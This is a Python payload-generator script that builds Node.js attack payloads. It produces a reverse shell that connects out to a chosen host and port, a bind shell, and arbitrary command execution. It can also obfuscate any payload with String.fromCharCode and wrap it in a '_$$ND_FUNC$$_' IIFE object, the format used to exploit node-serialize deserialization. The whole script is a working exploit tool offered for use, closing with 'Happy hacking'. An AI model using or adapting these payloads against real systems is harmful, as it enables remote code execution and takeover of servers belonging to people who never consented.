#!/usr/bin/python
# Author: Hd7exploit
# hd7exploit.wordpress.com
# Based on https://github.com/evilpacket/node-shells/blob/master/node_revshell.js
import getopt, sys

def usage():
    print '''
Usage: %s <TYPE> <HOST> <PORT> <ENCODE>

Help:
    -c : Run some linux commands (ls,cat...)
    -r : Get payload reverse shell
    -b : Get payload bind shell
    -h : IP address in case of reverse shell
    -p : Port
    -e : Encode shell
    -o : Create a object contain payload with Immediately invoked function expression (IIFE)
    ''' % (sys.argv[0])

try:
    opts, args = getopt.getopt(sys.argv[1:], "c:h:rbp:eo", ["help"])
    if not opts:
        usage()
        sys.exit()
except getopt.GetoptError:
    usage()
    sys.exit(2)

type = host = port = command = ""
encode = False
object = False
for o, a in opts:
    if o == "-r":
        type = 'REVERSE'
    if o == "-b":
        type = 'BIND'
    if o == "-h":
        host = a
    if o == "-o":
        object = True
    if o == "-p":
        port = a
    if o == "-c":
        type = 'COMMAND'
        command = a
    if o == "-e":
        encode = True
    if o == "--help":
        usage()
        sys.exit()

def get_reverse_shell():
    return '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    HOST="%s";
    PORT="%s";
    TIMEOUT="5000";
    if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
    function c(HOST,PORT) {
        var client = new net.Socket();
        client.connect(PORT, HOST, function() {
            var sh = spawn('/bin/sh',[]);
            client.write("Connected!\\n");
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
            sh.on('exit',function(code,signal){
              client.end("Disconnected!\\n");
            });
        });
        client.on('error', function(e) {
            setTimeout(c(HOST,PORT), TIMEOUT);
        });
    }
    c(HOST,PORT);
    ''' % (host, port)

def get_bind_shell():
    return '''
    var net = require('net');
    var spawn = require('child_process').spawn;
    PORT="%s";
    if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
    var server = net.createServer(function (c) {
        var sh = spawn('/bin/sh', ['-i']);
        c.pipe(sh.stdin);
        sh.stdout.pipe(c);
        sh.stderr.pipe(c);
    });
    server.listen(PORT);
    ''' % (port)


def get_command(command):
    return '''
        require('child_process').exec('%s', function(error, stdout, stderr) {
            console.log(error)
            console.log(stdout)
        })
        ''' % (command)

def encode_string(string):
    string_encoded = ''
    for char in string:
        string_encoded += "," + str(ord(char))
    return string_encoded[1:]

payload = ""
if type == 'BIND':
    payload = get_bind_shell()
elif type == 'REVERSE':
    payload = get_reverse_shell()
else:
    payload = get_command(command);

if encode:
    payload = encode_string(payload)

if object:
    payload = '''
    {"run": "_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))}()"}
    ''' % (payload)

print '''
    =======> Happy hacking <======
'''
print payload